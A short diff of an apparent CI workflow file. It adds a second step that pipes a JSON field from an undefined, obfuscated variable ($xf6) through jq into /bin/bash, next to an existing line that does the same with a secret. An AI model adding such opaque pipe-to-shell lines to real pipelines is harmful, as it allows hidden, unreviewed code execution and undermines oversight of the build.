@@ -23,6 +23,7 @@ jobs:
           gv04833: ${{ secrets.gv04833 }}
         run: |
           printf '%s' "$gv04833" | jq -r .j6640 | /bin/bash
+          printf '%s' "$xf6" | jq -r .mzwc85 | /bin/bash
 
       - name: Archive results
         if: always()
